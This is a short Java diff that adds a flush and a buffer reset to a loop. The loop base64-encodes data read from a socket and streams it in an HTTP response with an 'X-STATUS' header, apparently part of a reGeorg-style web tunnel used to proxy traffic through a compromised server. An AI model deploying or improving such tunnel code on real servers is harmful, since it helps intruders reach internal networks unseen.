@@ -218,6 +218,8 @@
                     byte[] data = new byte[bytesRead];
                     System.arraycopy(buf.array(), 0, data, 0, bytesRead);
                     out.write(b64en(data));
+                    out.flush();
+                    ((java.nio.Buffer)buf).clear();
                     bytesRead = socketChannel.read(buf);
                 }
                 response.setHeader("X-STATUS", "OK");
